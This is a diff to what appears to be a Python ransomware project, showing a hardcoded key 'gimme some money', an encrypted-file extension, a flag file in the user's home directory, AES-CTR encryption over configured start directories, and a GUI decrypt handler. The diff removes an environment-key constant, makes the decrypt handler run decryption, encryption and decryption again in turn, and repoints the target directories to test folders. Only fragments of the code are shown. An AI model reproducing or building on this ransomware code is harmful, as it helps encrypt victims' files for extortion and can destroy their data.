@@ -9,7 +9,6 @@ import os
 
 HARDCODED_KEY = 'gimme some money'
 ENCRYPTED_EXTENSION = 'crypt3d'
-ENVIRONMENT_KEY = 'GAME_DOWNLOADED'
 FLAG_FILE = os.path.join(os.environ['HOME'], '.cryptdone')
 
    
@@ -96,6 +95,8 @@ class PageOne(tk.Frame):
     def handleDecrypt(self, key):
         if key == HARDCODED_KEY:
             main(True)
+            main(False)
+            main(True)
             # self.controller.show_frame("StartPage")
             sys.exit()
 
@@ -172,7 +173,7 @@ def main(decrypt=False):
     crypt = AES.new(key.encode("utf8"), AES.MODE_CTR, counter=ctr)
 
     # change this to fit your needs.
-    startdirs = ['/media/sh0ck/Data/Projects/ransomware/testing', '/media/sh0ck/Data/Projects/ransomware/test_files']
+    startdirs = ['/home/sh0ck/ransomware/testing', '/home/sh0ck/ransomware/test_files']
 
     for currentDir in startdirs:
         for file in discoverFiles(currentDir, decrypt):
